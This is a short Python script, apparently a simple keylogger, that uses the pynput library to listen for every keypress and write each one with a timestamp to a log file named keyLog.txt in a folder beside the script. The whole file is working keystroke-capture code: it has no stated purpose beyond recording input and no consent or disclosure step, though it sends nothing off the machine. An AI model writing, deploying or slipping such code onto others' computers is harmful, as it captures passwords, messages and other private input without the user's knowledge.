import pynput
from pynput.keyboard import Key, Listener
import logging
import os  

script_dir = os.path.dirname(os.path.abspath(__file__))

log_dir = os.path.join(script_dir, "keylogger/")

os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(filename=os.path.join(log_dir, "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
